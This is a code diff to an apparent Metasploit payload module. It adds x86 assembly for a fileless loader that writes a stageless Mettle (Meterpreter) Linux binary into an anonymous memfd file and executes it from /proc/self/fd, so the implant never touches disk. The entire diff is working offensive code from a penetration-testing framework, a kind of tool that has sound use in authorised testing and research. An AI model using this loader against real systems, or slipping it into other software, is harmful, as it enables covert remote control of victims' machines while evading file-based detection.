@@ -36,6 +36,41 @@ module MetasploitModule
       scheme: 'tcp',
       stageless: true
     }.merge(mettle_logging_config)
-    MetasploitPayloads::Mettle.new('i486-linux-musl', generate_config(opts)).to_binary :exec
+    payload = MetasploitPayloads::Mettle.new('i486-linux-musl', generate_config(opts)).to_binary :exec
+    in_memory_loader_asm = %Q^
+      start:
+        xor ecx, ecx
+        push ecx
+        lea ebx, [esp]
+        inc ecx
+        mov eax, 0x164
+        int 0x80                            ; memfd_create("", MFD_CLOEXEC);
+        mov ebx, eax
+        jmp get_payload
+      got_payload:
+        pop ecx
+        mov edx, #{payload.length}
+        mov esi, eax
+        mov eax, 0x4
+        int 0x80                            ; write(fd, elfbuffer, elfbuffer_len);
+        jmp get_command
+      got_command:
+        add esi, 48
+        pop ebx
+        mov [ebx + 14], esi
+        xor ecx, ecx
+        xor edx, edx
+        mov eax, 0xb
+        int 0x080                           ; execve("/proc/self/fd/<fd>", NULL, NULL);
+
+      get_command:
+        call got_command
+        db "/proc/self/fd/", 0x00, 0x00
+      get_payload:
+        call got_payload
+    ^
+    in_memory_loader = Metasm::Shellcode.assemble(Metasm::X86.new, in_memory_loader_asm).encode_string
+
+    in_memory_loader + payload
   end
 end
